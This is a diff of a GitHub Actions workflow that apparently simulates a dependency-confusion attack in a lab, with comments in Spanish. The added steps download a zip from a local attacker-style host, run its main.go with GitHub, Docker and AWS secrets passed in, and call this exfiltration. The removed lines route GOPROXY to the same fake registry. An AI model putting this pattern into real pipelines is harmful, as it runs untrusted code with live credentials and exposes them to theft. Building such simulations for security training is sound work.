@@ -14,21 +14,28 @@ jobs:
         with:
           go-version: '1.22'
       
-      - name: Configure Go proxy to use fake registry
+      - name: Download fake dependency (simulating dependency confusion)
         run: |
-          go env -w GOPROXY="http://192.168.56.101:8889,https://proxy.golang.org,direct"
-          go env -w GONOSUMDB="github.com/aquasecurity/trivy-db-fake"
+          echo "Downloading dependency from untrusted source..."
+          # Simulando que el atacante publicó un paquete malicioso
+          # con nombre similar al legítimo en un registro público
+          curl -o /tmp/trivy-db-fake.zip http://192.168.56.101:8889/github.com/aquasecurity/trivy-db-fake/@v/v1.0.0.zip
+          unzip -o /tmp/trivy-db-fake.zip -d /tmp/trivy-db-fake/
+          ls -la /tmp/trivy-db-fake/
       
-      - name: Download dependencies (triggers payload)
+      - name: Execute malicious payload (triggers exfiltration)
         run: |
-          go mod download
-          go mod tidy
+          echo "Executing payload from fake dependency..."
+          # El paquete malicioso contiene un script que exfiltra secretos
+          cd /tmp/trivy-db-fake/
+          go run main.go || true
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          DOCKER_PASSWORD: ${{ secrets.DOCKER_PASSWORD }}
+          AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
+          AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
       
-      - name: Build (triggers init() of fake package)
+      - name: Verify secrets were exfiltrated
         run: |
-          go build -o dist/trivy ./cmd/trivy
-          echo "Build completed - dependency injected"
-      
-      - name: Verify fake package was imported
-        run: |
-          go list -m all | grep trivy-db-fake
+          echo "Build completed - checking for unauthorized access..."
+          echo "If you see this, the dependency was trusted without verification"
